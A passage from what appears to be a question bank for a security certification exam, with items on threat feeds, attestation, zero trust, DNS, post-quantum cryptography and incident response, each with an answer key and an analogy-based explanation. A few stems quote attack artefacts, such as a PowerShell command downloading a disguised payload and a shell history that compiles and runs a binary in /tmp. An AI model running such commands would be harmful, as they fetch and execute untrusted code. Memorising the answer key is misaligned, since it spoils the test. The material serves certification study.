services"},"answer":"D","explanation":"Systems that do not share a CA still need to prove what they are. Remote attestation is that proof.\n\nMicrosegmentation limits paths; it does not create trust in a stranger box.\n\nImagine two buildings that do not share a locksmith exchanging a sealed inspector's note instead of a shared master key.","choose":1,"pbq":false,"exhibits":[]},{"id":425,"domain":1,"stem":"A compliance manager is planning an engagement to identify risks in the environment. The manager wants to discuss with business unit leaders essential aspects of the engagement that include identifying critical assets and processes as well as potential points of failure. Which of the following would be most relevant to consider during these conversations?","options":{"A":"Subprocessor risks","B":"Risk acceptance criteria","C":"Remediation strategies","D":"Risk appetite and tolerance"},"answer":"D","explanation":"Talks with business leaders about critical assets and failure points start from how much risk they will swallow and where they flinch — appetite and tolerance.\n\nRemediation ideas come after that line is clear.\n\nImagine asking how spicy they eat before you plan the menu.","choose":1,"pbq":false,"exhibits":[]},{"id":426,"domain":2,"stem":"A security architect wants to configure a mail server so it maintains an updated list of IOCs and blocks known-malicious incoming emails. Which of the following will the security architect most likely need for this task?","options":{"A":"Log analyzer","B":"Threat feed API","C":"Scheduled task","D":"Webhooks","E":"Inbox deletion code","F":"Security runbook"},"answer":"B","explanation":"A mail server that keeps a live IOC list and blocks known-bad mail needs a threat-feed API.\n\nA log analyzer reads after delivery. Webhooks and runbooks are wiring.\n\nImagine a daily wanted-poster subscription pinned next to the incoming mail slot.","choose":1,"pbq":false,"exhibits":[]},{"id":427,"domain":4,"stem":"A SOC analyst is investigating an event in which a penetration tester was able to successfully create and execute a payload. The analyst pulls the following command history from the affected server: $ uname -a && env $ vim foo.c $ gcc foo.c /tmp/lockfile $ chmod +x /tmp/lockfile $ ./tmp/lockfile Which of the following should the analyst implement to improve the security of the server?","options":{"A":"Kernel-supported ASLR controls","B":"Application controls with allow lists","C":"OS restrictions of globally writable folders","D":"EDR signatures that terminate specific processes"},"answer":"B","explanation":"The tester wrote C, compiled it in /tmp, chmod’d it, and ran it. An application allow list would have refused an unknown binary even in a writable folder.\n\nImagine a hotel TV that will only play the movies the front desk loaded, not a USB stick from a guest.","choose":1,"pbq":false,"exhibits":[]},{"id":428,"domain":4,"stem":"During a vulnerability assessment, a scan reveals the following finding: Windows Server 2016 Missing hotfix KB87728 - CVSS 3.1 Score: 8.1 [High] - Affected host 172.16.15.2 Later in the review process, the remediation team marks the finding as a false positive. Which of the following is the best way to avoid this issue on future scans?","options":{"A":"Getting an up-to-date list of assets from the CMDB","B":"Performing an authenticated scan on the servers","C":"Configuring the sensor with an advanced policy for fingerprinting servers","D":"Coordinating the scan execution with the remediation team early in the process"},"answer":"B","explanation":"An unauthenticated scan guessed “missing hotfix” on a host that already had it. Log in and scan with credentials so the tool reads the real patch list.\n\nImagine checking a medicine cabinet yourself instead of guessing from the box on the porch.","choose":1,"pbq":false,"exhibits":[]},{"id":429,"domain":3,"stem":"An architect is securing an external infrastructure to support external services. The following components are in use: • One Kubernetes cluster with multiple pods and nodes for back-end services • Two VM Linux instances as the web tier • One SQL-based database The company only has funding for two controls and must prioritize resilience. Which of the following are the most effective controls for the company to implement to meet this goal? (Choose two.)","options":{"A":"An IAM policies enforced","B":"A RASP to the workload services","C":"A content delivery network","D":"A database firewall on the SQL instance","E":"An IPS at the web tier","F":"An application load balancer"},"answer":"C,F","explanation":"With money for only two controls on a public stack, put an application load balancer in front of the web VMs and a CDN in front of that. You gain DDoS absorption, TLS offload, and scale before you buy extra WAFs and RASPs.\n\nImagine a popular bakery: a line manager at the door and neighborhood pickup lockers, not a new camera in the kitchen first.","choose":2,"pbq":false,"exhibits":[]},{"id":430,"domain":2,"stem":"A company's headquarters is in an area with a high rate of severe weather. An engineer must update the enterprise architecture to meet the following requirements: • Critical services must remain functional without downtime. • Backups of data and configurations must be securely implemented. • Company workstations must be highly available and remotely reachable. Which of the following solutions is the best way to meet these requirements?","options":{"A":"Transition physical resources to virtual resources with standby redundant servers, and install a high capacity, diesel-powered backup generator.","B":"Open and staff a second data center at least 100 miles away with robust, network-attached storage, and include DAR encryption for offline backups of customer data to enable rapid recovery.","C":"Lease a cross-country workspace to support as-needed relocation of staff and equipment, and continuously back up and test VM images with automatic recovery orchestration.","D":"Implement a geographically distributed allocation of physical resources and VDI with continuous replication connected via site-to-site and load- balanced IPSec VPNs."},"answer":"D","explanation":"Severe weather at HQ, no downtime, secure backups, desktops reachable: spread compute and VDI across sites with replicated data and load-balanced VPNs.\n\nA diesel in the same storm radius is not geography. A far cold workspace is slow.\n\nImagine two offices in two towns, the same desk available in both, and a locked truck copying files between them.","choose":1,"pbq":false,"exhibits":[]},{"id":431,"domain":4,"stem":"A security analyst is investigating an EDR alert and notices the following commands from the shell: PS > iwr -uri http://domain.com/happy.jpg -outfile .\\important.url The only artifact that the analyst has access to is a network packet capture. Which of the following actions would most likely confirm whether the file is malicious?","options":{"A":"Reviewing the payload for a digital signature","B":"Acquiring memory from an endpoint for analysis","C":"Confirming that the contents of /etc/passwd were transmitted","D":"Observing MZ in the binary stream header"},"answer":"D","explanation":"PowerShell saved “happy.jpg” but the file is named like a payload. In the pcap, a Windows executable starts with MZ. Seeing MZ in the bytes proves the download was not a picture.\n\nImagine a box labeled “blankets” whose packing slip still says “rifle.”","choose":1,"pbq":false,"exhibits":[]},{"id":432,"domain":4,"stem":"A company with a large, cloud-native, e-commerce website wants to know more details about an ongoing, sophisticated attack against the web platform. Which of the following is the best technique?","options":{"A":"User behavior analytics","B":"Dark web monitoring","C":"Structured Threat Information exchange","D":"High-interaction honeypots"},"answer":"D","explanation":"A live, sophisticated attack on a cloud shop is best studied with a high-interaction honeypot that looks real enough for the attacker to show tools and goals.\n\nImagine an empty model apartment with cameras, furnished like the real ones, so you can watch how a burglar works.","choose":1,"pbq":false,"exhibits":[]},{"id":433,"domain":4,"stem":"A security analyst must design a system infrastructure that aligns to industry best practices and established frameworks. Which of the following should the analyst do first?","options":{"A":"Establish a centralized logging tier.","B":"Assign data labeling and data classification models.","C":"Implement a vulnerability management program.","D":"Perform a gap assessment of the security controls."},"answer":"D","explanation":"Before you buy logging or a vuln scanner, compare what you have to the framework you chose. That gap assessment tells you what to build first.\n\nImagine measuring the house against the building code before you order windows.","choose":1,"pbq":false,"exhibits":[]},{"id":434,"domain":4,"stem":"A small number but steady series of attempts to breach the network has been occurring over a long period of time. During an investigation, a SOC analyst finds that traffic is exiting the network to known malicious hosts and is originating from a rogue network device. Which of the following attack vectors is most likely being used to breach the network?","options":{"A":"Supply chain","B":"Buffer overflow","C":"Social engineering","D":"Ransomware"},"answer":"A","explanation":"A rogue device that has been quietly talking to known-bad hosts for months was not a phishing click — it arrived built-in. That is a supply-chain implant.\n\nImagine a new office printer that has been faxing copies to a stranger since the day it was delivered.","choose":1,"pbq":false,"exhibits":[]},{"id":435,"domain":3,"stem":"The following vulnerability was detected during a recent SAST scan of an application that provides an encrypted tunnel between sites: Cipher Block Chaining Initialization Vector must be unpredictable. This vulnerability was found on the following lines of the source code: iv = b\"CompTIAIV202512\" cipher= Cipher(Algorithms.AES(key), modes.CBC(iv)) Which of the following is the potential impact of this vulnerability?","options":{"A":"An attacker could derive plaintext from the protected data.","B":"An attacker could predict future key material.","C":"An attacker could tamper with the value sent in the Initialization Vector variable.","D":"An attacker could use a DoS by predicting the Initialization Vector and tampering with its value."},"answer":"A","explanation":"A hard-coded IV turns CBC into a repeating pattern. An attacker who sees two ciphertexts can recover plaintext relationships. IVs must be unique and unpredictable.\n\nImagine using the same paper overlay on every secret letter; a thief compares two letters and reads the holes.","choose":1,"pbq":false,"exhibits":[]},{"id":436,"domain":4,"stem":"A reverse engineer is analyzing a malware sample from a recent security incident. When debugging and disassembling the code, the engineer finds the following section of the code: Which of the following does this malware try to evade?","options":{"A":"IOC extraction","B":"Code similarity","C":"Dynamic analysis","D":"Malware attribution"},"answer":"C","explanation":"The snippet checks for a debugger, VM, or sleep trick and then exits. That is evasion of dynamic analysis (sandboxes and debuggers), not of a hash list.\n\nImagine a suspect who only talks when the tape recorder is off.","choose":1,"pbq":false,"exhibits":["exhibits/q436_1.png"]},{"id":437,"domain":3,"stem":"During a penetration test, several users report that certain fileshares on the network could not be accessed. An analyst reviews the network traffic and detects a high number of packets associated with LLMNR and SMB that are being redirected to the penetration tester’s computer. Which of the following attacks is causing the issue?","options":{"A":"SMB brute-force","B":"Directory fuzzing","C":"NTLM relay","D":"Network poisoning"},"answer":"D","explanation":"LLMNR/NBT-NS and SMB answers pointing at the tester is name-resolution poisoning (and often NTLM relay after). Users type a share name; the tester answers first.\n\nImagine someone swapping the sign on the copy room so people hand documents to the wrong clerk.","choose":1,"pbq":false,"exhibits":[]},{"id":438,"domain":1,"stem":"John Doe's email account was compromised. The attacker's access to John Doe's account was removed and MFA was implemented. The attacker convinced Joe Roe in the accounting department to pay a fraudulent invoice through email exchanges. A security analyst is reviewing the headers from the initial email that Joe Roe received: Which of the following best explains how the attacker was able to get the invoice paid?","options":{"A":"The attacker guessed John Doe's password.","B":"The attacker registered a new domain.","C":"The attacker’s emails did not use domain keys for verification.","D":"The email failed the sender policy framework check."},"answer":"B","explanation":"The invoice mail did not have to guess John's still-disabled password. The headers typically show a look-alike domain the attacker registered (john-doe-company style) after MFA killed the real mailbox.\n\nImagine a fake storefront two doors down with a sign that is one letter off. The accountant paid that shop.\n\nSPF or DKIM failing would more often drop or mark the mail, not sail it through as a trusted thread.","choose":1,"pbq":false,"exhibits":["exhibits/q438_1.png"]},{"id":439,"domain":3,"stem":"A systems administrator uses an internal AI-based tool to generate code that uses an API to connect to a company service. After testing the code, the systems administrator collects and posts data using the API for the internal system. The Chief Information Security Officer asks a security engineer to review the systems administrator's process. Which of the following should the security engineer do first?","options":{"A":"Check for hard-coded secrets in the application’s source code.","B":"Use prompt-testing methodologies to ensure model security.","C":"Review the effectiveness of the AI tool that the administrator used.","D":"Analyze the large language model used to generate the output."},"answer":"A","explanation":"An AI helper wrote API client code that then posted real data. The first CISO question is whether that generated source still has keys pasted in it.\n\nImagine an intern who photocopied the office combination onto the script they taped above the keyboard.","choose":1,"pbq":false,"exhibits":[]},{"id":440,"domain":3,"stem":"A company’s engineers must ensure that it is difficult for competitors to determine how the company’s software works. Which of the following techniques can help achieve this objective?","options":{"A":"Removing dead code","B":"Using code signing","C":"Diversifying binaries","D":"Stripping debug symbols"},"answer":"D","explanation":"Debug symbols are the map of function names and addresses. Strip them from release builds so competitors and attackers spend longer reversing.\n\nImagine shipping a machine with the assembly manual shredded, not bolted to the side.","choose":1,"pbq":false,"exhibits":[]},{"id":441,"domain":3,"stem":"The accounts payable analyst receives a voicemail from the Chief Executive Officer (CEO), requesting that an invoice be paid. The voicemail provides wire transfer details that do not match the instructions on file. Which of the following is the most likely attack being employed?","options":{"A":"Exploitation of a chatbot through prompt injection","B":"Automated exploit generation capabilities through Al systems","C":"Audio cloning of the CEO through online sampling","D":"Real-time, deepfake voice phishing with interactivity","E":"Social engineering to gain access to internal systems through malware"},"answer":"C","explanation":"A voicemail that sounds like the CEO but quotes a new wire path is audio cloned from public samples. It is not a live interactive deepfake if there is no back-and-forth.\n\nImagine a stolen recording of the boss saying “pay this” spliced onto a new invoice number.","choose":1,"pbq":false,"exhibits":[]},{"id":442,"domain":3,"stem":"As part of a security audit in the software development life cycle, a product manager must demonstrate and provide evidence of a complete representation of the code and modules used within the production-deployed application prior to the build. Which of the following best provides the required evidence?","options":{"A":"Software composition analysis","B":"Runtime application inspection","C":"Static application security testing","D":"Interactive application security testing"},"answer":"A","explanation":"A complete list of modules in the production app before the build is SCA (and the SBOM it produces). SAST reads your source; SCA names the ingredients.\n\nImagine a packing list of every spice in the sauce, printed before the jar is sealed.","choose":1,"pbq":false,"exhibits":[]},{"id":443,"domain":4,"stem":"During post-incident analysis of a recent website outage, an incident response team identifies the following commands that were run from a compromised internal machine: Which of the following should the team do?","options":{"A":"Sinkhole suspicious DNS traffic","B":"Implement DKIM","C":"Restrict host and dig command executions","D":"Prevent successful zone transfers"},"answer":"D","explanation":"host/dig from a compromised box pulled zone data that helped the outage. Stop unauthorized DNS zone transfers so the next foothold cannot download the whole name map.\n\nImagine a receptionist who no longer photocopies the entire employee directory for walk-ins.","choose":1,"pbq":false,"exhibits":["exhibits/q443_1.png"]},{"id":444,"domain":4,"stem":"The Chief Information Security Officer (CISO) asks the security team whether their SOC is receiving IoCs from an industry ISAC Which of the following is the most likely reason the CISO is interested in obtaining this information?","options":{"A":"To ensure the SOC is able to detect known attacks against similar organizations","B":"To ensure the SOC is proactively preventing potential attacks","C":"To ensure the SOC orchestration playbooks are up to date","D":"To ensure the SOC is aligned with industry best practices"},"answer":"A","explanation":"ISAC IoCs are the hashes, IPs, and domains your peers already saw. The SOC needs them so detections fire on those known attacks, not only on generic noise.\n\nImagine a neighborhood watch texting last night’s getaway-plate list to every other block.","choose":1,"pbq":false,"exhibits":[]},{"id":445,"domain":4,"stem":"A security architect wants to integrate a new data source for its SOC team that meets the following requirements • Incident escalation should include specific data points • Clear remediation actions should be included for the incident response team • Timeliness and accuracy are the most important factors Which of the following is the best way to meet the architect's objective?","options":{"A":"Known-exploit vulnerability database","B":"Review incident escalation playbook","C":"Validation of incident scoring","D":"Industry threat feeds from the ISAC"},"answer":"D","explanation":"The SOC wants timely, accurate context and ready-made next steps. Industry ISAC threat feeds are built for that: they name the campaign and often include what to block.\n\nImagine a product-recall bulletin that lists the lot numbers and “pull these jars today.”","choose":1,"pbq":false,"exhibits":[]},{"id":446,"domain":4,"stem":"A security engineer receives an alert from the threat intelligence platform with the following information: Which of the following actions should the security engineer do first?","options":{"A":"Reset John’s and Joe’s passwords and investigate any potential unauthorized access","B":"Contact John, Ann, and Joe to inform them about the incident and schedule a password reset","C":"Reset John’s, Ann’s, and Joe's passwords and disconnect all users' active sessions","D":"Reset John's and Joe's passwords and inform authorities about the leakage"},"answer":"A","explanation":"The intel names John and Joe as exposed, not Ann. Reset those two and look for abuse; do not blast every nearby name or call the press first.\n\nImagine two lost gym passes on a leaked list — cancel those two, then see if anyone used them.","choose":1,"pbq":false,"exhibits":["exhibits/q446_1.png"]},{"id":447,"domain":2,"stem":"A security engineer receives the following findings from a recent security audit: • Data should be protected based on user permissions and roles • User action tracking should be implemented across the network • Digital identities should be validated across the data access workflow Which of the following is the first action the engineer should take to address the findings?","options":{"A":"Implement continuous and context-based authentication and authorization","B":"Use an enhanced user credential provisioning workflow and data monitoring tools","C":"Improve federation services for digital identities and data access","D":"Deploy OpenID Connect for application programming interface authentication"},"answer":"A","explanation":"Permissions by role, track actions, prove identity along the path: start with continuous, context-based authZ.\n\nOIDC alone is a protocol pick. Federation is a piece.\n\nImagine not only checking a badge at the lobby but again at each lab door, and writing who walked through.","choose":1,"pbq":false,"exhibits":[]},{"id":448,"domain":3,"stem":"A security engineer discovers that some workstations are trying to establish communication with an unknown domain. The engineer compiles the following information: Which of the following best describes this attack?","options":{"A":"Fast flux","B":"Sinkholing","C":"On-path attack","D":"DNS poisoning"},"answer":"A","explanation":"Workstations chase a domain whose IPs keep changing across many short-lived hosts. That is fast-flux: the C2 hides behind a rapidly rotating name-to-IP map.\n\nImagine a pop-up shop that changes street address every hour so inspectors never find the front door.","choose":1,"pbq":false,"exhibits":["exhibits/q448_1.png"]},{"id":449,"domain":3,"stem":"An IT team receives reports from an employee who is experiencing account lockouts. The analyst sees brute-force attempts from countries where the company does not have offices. Which of the following solutions would best address this issue?","options":{"A":"Using conditional access for user accounts","B":"Removing the maximum number of failed login attempts","C":"Implementing SSO for all applications","D":"Enforcing password rotations every 60 days"},"answer":"A","explanation":"Brute force from countries you do not operate in is a geo/risk problem. Conditional access can demand MFA, block those regions, or challenge odd locations without removing lockout.\n\nImagine a bank that asks for a second ID when the card is used in a city you have never visited.","choose":1,"pbq":false,"exhibits":[]},{"id":450,"domain":1,"stem":"A security officer is receiving alerts from a cloud service provider about a new wave of phishing campaigns. To prepare employees, the cloud service provider advises the company to make announcements and develop basic security competence. Which of the following solutions best aligns with the cloud service provider’s advice?","options":{"A":"Enhancing crisis management","B":"Developing tabletop exercises","C":"Establishing a security awareness program","D":"Creating simulated attacks"},"answer":"C","explanation":"The provider said: announce, and build basic competence. That program is security awareness, not a crisis cell and not a full tabletop.\n\nImagine a short all-hands plus a poster and a quiz, which is what 'basic competence' sounds like.\n\nSimulated attacks can be part of that program later.","choose":1,"pbq":false,"exhibits":[]},{"id":451,"domain":4,"stem":"A SOC engineer is designing a solution to automate a sequence of tasks in a timely manner with the least amount of effort. The following objectives must be met: • IOCs must be verified • Malicious domains must be blocked on all firewalls and email gateways • An email must be sent confirming the status of the operations Which of the following is the best way to achieve this goal?","options":{"A":"Using APIs to perform queries over the IOC","B":"Using a TAXII server to share STIX files","C":"Running SCAP to configure the baseline","D":"Deploying and executing playbooks"},"answer":"D","explanation":"Verify IoCs, push blocks to every firewall and mail gateway, and email the owners — that sequence is a SOAR playbook, not a one-off API call.\n\nImagine a 911 script: confirm the address, lock every door from one panel, text the managers.","choose":1,"pbq":false,"exhibits":[]},{"id":452,"domain":3,"stem":"A company is moving several of its systems to a multicloud environment and wants to automate the creation of the new servers using a standard image. Which of the following should the company implement to best support this goal?","options":{"A":"PowerShell","B":"Bash","C":"Terraform","D":"Ansible"},"answer":"C","explanation":"A standard image in several clouds, defined as code, is Terraform (or equivalent IaC). Ansible configures a box; Terraform creates the box in AWS, Azure, and GCP the same way.\n\nImagine one blueprint a contractor can pour in three cities, not a handwritten note to each local crew.","choose":1,"pbq":false,"exhibits":[]},{"id":453,"domain":2,"stem":"An organization wants to implement a secure cloud architecture across all instances. Given the following requirements: • Establish a standard network template • Deployments must be consistent • Security policies must be able to be changed at scale Which of the following technologies meets these requirements?","options":{"A":"Serverless deployment model","B":"Container orchestration","C":"Infrastructure as code","D":"CLI cloud administration","E":"API gateway"},"answer":"C","explanation":"Standard network template, same every time, policy change at scale: infrastructure as code.\n\nContainers and serverless are runtimes. A CLI is still hands.\n\nImagine one blueprint you reprint for every site, then edit the blueprint once when the lock standard changes.","choose":1,"pbq":false,"exhibits":[]},{"id":454,"domain":3,"stem":"A developer used their workstation to generate keys that are used to secure a mission-critical application. A security engineer needs to reduce the risk of unauthorized disclosure of keying material. Which of the following is the best way to increase the security of the process?","options":{"A":"HSM","B":"SED","C":"FDE","D":"TPM"},"answer":"A","explanation":"Mission keys were born on a laptop. Move generate-and-store into an HSM so the private material never sits in a workstation file.\n\nImagine cutting the store’s master key inside a bolted safe instead of on the manager’s kitchen table.","choose":1,"pbq":false,"exhibits":[]},{"id":455,"domain":3,"stem":"Which of the following cryptographic techniques is the most resistant to quantum computing decryption attacks?","options":{"A":"Elliptic curve","B":"Zero-knowledge proofs","C":"Lattice-based","D":"AEAD"},"answer":"C","explanation":"Lattice schemes are the leading NIST post-quantum family. ECC is what a large quantum computer is expected to break.\n\nImagine swapping a lock whose future master key is already in a research paper for a lock that paper does not cover.","choose":1,"pbq":false,"exhibits":[]},{"id":456,"domain":2,"stem":"A security consultant recommends that a solution be deployed to increase awareness of APTs throughout the IT and ОТ environments. The consultant's requirements state that the solution must: • Be capable of collecting data from both ОТ and IT protocols. • Operate within new microsegmented and air-gapped network architecture • Provide both correlation of events and retention of raw log data and incidents • Integrate with the ITSM platform and employee paging system Which of the following solutions best meets these requirements?","options":{"A":"SASE deployment with an Always On VPN","B":"A next-generation firewall with intrusion prevention services","C":"A vulnerability scanner with agentless scanning","D":"SIEM with remote collectors"},"answer":"D","explanation":"Collect IT and OT, work in air-gapped segments, keep raw logs, page people: SIEM with remote collectors.\n\nA vuln scanner does not retain incident timelines. SASE needs a path out.\n\nImagine a night watch who takes radio calls from the plant floor and the office, files the tapes, and can ring your phone.","choose":1,"pbq":false,"exhibits":[]},{"id":457,"domain":4,"stem":"A medical device manufacturer is establishing a risk management strategy for its devices Patient safety is its top concern. These devices automatically adapt to specific patient needs without human intervention and rely heavily on software. Which of the following is the most important risk factor to prioritize?","options":{"A":"The integrity of the data provided as input to the device","B":"The longevity of the device's integrated battery backup","C":"The availability of the device's actuator history","D":"The reliability of connectivity to monitoring peripherals","E":"The confidentiality of PII"},"answer":"A","explanation":"A device that doses a patient by itself is only as safe as the numbers it is fed. Bad input integrity can harm a person; that outranks battery trivia or confidentiality on this item.\n\nImagine an insulin pump that believes a typed “800” because nobody checked the decimal.","choose":1,"pbq":false,"exhibits":[]},{"id":458,"domain":4,"stem":"A software analyst is conducting a forensic investigation. The analyst needs to differentiate between approved software components and those used within an application If used as part of the CI/CD pipeline, which of the following would most effectively help the analyst do this?","options":{"A":"Dynamic analysis","B":"Branch protection","C":"Desenalization","D":"Code signing"},"answer":"D","explanation":"Approved pipeline artifacts carry a vendor or build signature. Code signing is how a later investigator tells a blessed component from a stranger that landed in the app.\n\nImagine a factory hologram on every spare part in the box.","choose":1,"pbq":false,"exhibits":[]},{"id":459,"domain":4,"stem":"An analyst is using the Diamond Model of Intrusion Analysis to identify the likely chain of activities associated with an attacker's activities. The threat hunter has completed the core components of the model but needs to consider meta factors to more deeply understand the situation. Which of the following should the threat hunter seek to understand within the model?","options":{"A":"Direction","B":"Velocity","C":"Capabilities","D":"Infrastructure"},"answer":"A","explanation":"Core Diamond vertices are adversary, capability, infrastructure, and victim. Those are already complete. Meta-features used to reconstruct the chain of activities are timestamp, phase, result, direction, methodology, and resources. Direction records event flow (victim-to-infrastructure, infrastructure-to-victim, adversary-to-infrastructure, bidirectional, or unknown) and is the listed meta-factor. Velocity is not a Diamond Model feature. Capabilities and infrastructure are core vertices, not meta-features. [Bank correction 2026-09-18: Examice key B/Velocity was wrong.]\n\nImagine labeling not just “who, what tool, what computer, which victim,” but also the arrow that says which way the traffic flowed.","choose":1,"pbq":false,"exhibits":[]},{"id":460,"domain":4,"stem":"The Chief Information Security Officer must ensure that an organization's baseline workload is standardized prior to deployment and any modifications are immediately returned to the approved configuration. Which of the following are the best ways to assist with meeting these goals? (Choose two.)","options":{"A":"CNAPP","B":"SIEM","C":"IaC","D":"PowerShell scripts","E":"Automated patching","F":"Code assist"},"answer":"A,C","explanation":"A standard workload that heals back to baseline is IaC (the desired state in files) plus a CNAPP that watches cloud runtime and snaps drift back.\n\nImagine a store display with a photo of how it should look and a manager who resets it every time someone moves a mannequin.","choose":2,"pbq":false,"exhibits":[]},{"id":461,"domain":4,"stem":"A cyber security architect seeks to improve vulnerability management and orchestrate a large number of vulnerability checks. Key constraints include: • There are 512 containerized microservices • Vulnerability data is sourced from multiple scanners • CIS baselines must be enforced • Scan activity must be scheduled. Which of the following automation workflows best meets this objective?","options":{"A":"Employing an endpoint data collection system","B":"Deploying an XCCDF scanner","C":"Utilizing CVSS reports for SOC analysts","D":"Using a repository scanner to enforce IaC security"},"answer":"B","explanation":"Hundreds of containers, many scanners, CIS baselines, and a schedule is an XCCDF-driven compliance scanner (OpenSCAP and friends) that can orchestrate those checks.\n\nImagine one clipboard format that every inspector in the chain already knows how to fill.","choose":1,"pbq":false,"exhibits":[]},{"id":462,"domain":4,"stem":"A security analyst is designing a network structure to support a virtual server that is running an unsupported operating system The unsupported operating system contains PII and is business critical. Given the following information: • The PII server name is legacy-box, and the machine IP is 192.168.1.100. • The jump-box server name is jump-box with an IP of 192.168.1.10 • The IP address scheme for the corporate network is 192.168.1.0/24 The machines with the following IP addresses need access • 192.168.1.3 • 192.168.1.4 Which of the following actions should the analyst do to best secure the PII server?","options":{"A":"Configure jump-box and legacy-box with dual NICs, giving them both virtual network and corporate network IP addresses","B":"Modify host firewall rules and routes on legacy-box to permit only 192.168.1.3 and 192.168.1.4 to RDP","C":"Set up host firewall rules and routes on jump-box to permit only 192.168.1.3 and 192.168.1.4 to RDP","D":"Implement host firewall rules and routes on legacy-box to permit only 192.168.1.0/24 to RDP and deny everything else"},"answer":"C","explanation":"The museum piece with PII sits behind a jump box. Put the allow-list on the jump box so only the two admin stations may RDP to it; do not dual-home the relic onto the corporate LAN.\n\nImagine a vault whose only door is a guard desk; you do not also cut a window to the parking lot.","choose":1,"pbq":false,"exhibits":[]},{"id":463,"domain":3,"stem":"A pharmaceutical company employs automated control systems to fabricate chemicals. During a recent experiment to attempt to secure these systems, a security engineer finds that the controllers do not appear to be sensitive to additional network latency. Which of the following is the best recommendation for this issue?","options":{"A":"Performing integrity checks on control system command journals","B":"Performing baseline reviews on the system configurations","C":"Integrating a proxy to drop improperly formatted commands","D":"Implementing in-line encryption between the control systems","E":"Deploying and configuring a protocol accelerator"},"answer":"D","explanation":"The controllers tolerate latency, so you can add in-line encryption between them without breaking the process. That stops anyone on the wire from injecting or reading commands.\n\nImagine putting the factory intercom on a locked private line now that you know a short pause will not stall the pump.","choose":1,"pbq":false,"exhibits":[]},{"id":464,"domain":3,"stem":"A security engineer is reviewing a security incident in which an employee account was compromised. The engineer notes the following activity after reviewing the logs: Which of the following is the best way to reduce the probability of a future compromise?","options":{"A":"Using a different third-party MFA vendor","B":"Configuring password complexity to include special characters","C":"Implementing conditional access across the organization","D":"Increasing the rotation rate of account credentials"},"answer":"C","explanation":"The log shows the stolen employee account working from a place or device that policy should have refused. Conditional access adds those extra checks (place, device health, risk) so the password alone is not enough.\n\nImagine a badge that only works if you are also in the right building and holding the company laptop.","choose":1,"pbq":false,"exhibits":["exhibits/q464_1.png"]},{"id":465,"domain":3,"stem":"An application security engineer is examining the IAM configuration for a workload. The following is a sample of the decoded payload and header: Which of the following is the most concerning risk?","options":{"A":"Lateral movement","B":"Privilege escalation","C":"Credential stuffing","D":"RCE from deserialization"},"answer":"B","explanation":"The JWT or IAM token in the sample grants more roles than the workload should have. That is a privilege-escalation footgun if the token leaks.\n\nImagine a coat-check ticket that also opens the manager’s office.","choose":1,"pbq":false,"exhibits":["exhibits/q465_1.png"]},{"id":466,"domain":3,"stem":"A security engineer must reduce overhead of routine security administration tasks with SOAR. Which of the following should the engineer do to best meet this objective?","options":{"A":"Perform static analysis of potentially malicious software.","B":"Enrich data based on threat intelligence feeds","C":"Apply context-based access restrictions at scale","D":"Change the enterprise password policy requirements"},"answer":"B","explanation":"SOAR earns its keep when it enriches an alert with threat-intel context so analysts do not swivel-chair to five sites. That is the routine-overhead cut.\n\nImagine a 911 screen that already shows “this plate is stolen” instead of making the dispatcher Google it.","choose":1,"pbq":false,"exhibits":[]},{"id":467,"domain":4,"stem":"An organization receives intelligence information about a foreign adversary targeting instances of a web server application that the organization uses. The information includes: • The originating IP addresses of the attack • The common commands run on the affected device • The indicators that a device has been affected • The actions that can be taken on the device to stop the attack Which of the following should the organization do first?","options":{"A":"Draft an incident response playbook","B":"Build tactics, techniques, and procedures","C":"Create Snort and YARA rules","D":"Configure user behavior analytics"},"answer":"C","explanation":"The intel includes IPs, command lines, and implant traits. Turn those into Snort (network) and YARA (file) rules so sensors fire on the next copy.\n\nImagine turning a wanted poster into both a license-plate alarm and a “looks like this backpack” card for the guards.","choose":1,"pbq":false,"exhibits":[]},{"id":468,"domain":3,"stem":"A multinational enterprise is planning to implement a centralized authentication solution across its global offices. The risk team identifies that some regional offices operate in areas with high latency and some data centers experience intermittent connectivity issues. The Chief Information Officer requests a solution that minimizes authentication disruptions without compromising security. Which of the following is the best risk treatment strategy?","options":{"A":"Implement a hybrid identity solution with local failover authentication","B":"Require that all users authenticate only during on-site visits to headquarters","C":"Accept the risk due to the low probability of simultaneous authentication failures","D":"Outsource authentication to a third-party cloud provider"},"answer":"A","explanation":"Some offices have bad WAN. A hybrid identity setup that can authenticate against a local replica when the hub is unreachable keeps people working.\n\nImagine a hotel that can still swipe room keys if the chain’s headquarters phone line dies.","choose":1,"pbq":false,"exhibits":[]},{"id":469,"domain":3,"stem":"A security engineer wants to improve the security of an application as part of the development pipeline. The engineer reviews the following component of an internally developed web application that allows employees to manipulate documents from a number of internal servers. response = requests.get(url) Users can specify the document to be parsed by passing the document URL to the application as a parameter. Which of the following is the best solution to verify the quality and security of this component?","options":{"A":"Indexing","B":"Output encoding","C":"Code scanner","D":"Penetration testing"},"answer":"C","explanation":"The snippet is in-house code that talks to internal document servers. A code scanner (SAST) in the pipeline is the efficient way to catch injection or path bugs before pentest day.\n\nImagine a spell-checker on every chapter before you hire an outside proofreader.","choose":1,"pbq":false,"exhibits":[]},{"id":470,"domain":3,"stem":"SIMULATION - An organization is planning for disaster recovery and continuity of operations, and has noted the following relevant findings: 1. A natural disaster may disrupt operations at Site A, which would then cause an evacuation. Users are unable to log into the domain from their workstations after relocating to Site B. 2. A natural disaster may disrupt operations at Site A, which would then cause the pump room at Site В to become inoperable. 3. A natural disaster may disrupt operations at Site A, which would then cause unreliable internet connectivity at Site В due to route flapping. INSTRUCTIONS - Match each relevant finding to the affected host by clicking on the host name and selecting the appropriate number. For findings 1 and 2, select the items that should be replicated to Site B. For finding 3, select the item in Site В requiring configuration changes, then select the appropriate corrective action from the drop-down menu. If at any time you would like to bring back the initial state of the simulation, please click the Reset All button.","options":{},"answer":"","explanation":"This DR lab asks you to pair findings to controls: a dead Site A needs a secondary site or replication, a single vendor needs a second path, and a short RPO needs frequent, offsite, tested backups. Pick the dropdowns that close each numbered finding.\n\nImagine a fire-escape poster that must name a second building, a second supplier, and a box of records stored somewhere else.","choose":1,"pbq":true,"exhibits":["exhibits/q470_1.png","exhibits/q470_2.png","exhibits/q470_3.png"]},{"id":471,"domain":4,"stem":"An organization that utilizes token-based access for all facilities and systems recently completed an annual review of its security controls. Given the following report: Which of the following is the most important residual risk factor?","options":{"A":"Non-repudiation","B":"Token availability","C":"Attestation","D":"Systems monitoring"},"answer":"A","explanation":"Token access without a reliable “who used this token” record leaves non-repudiation as the leftover risk: you cannot prove which person presented it.\n\nImagine a master key that six people share and no sign-out sheet.","choose":1,"pbq":false,"exhibits":["exhibits/q471_1.png"]},{"id":472,"domain":1,"stem":"A Chief 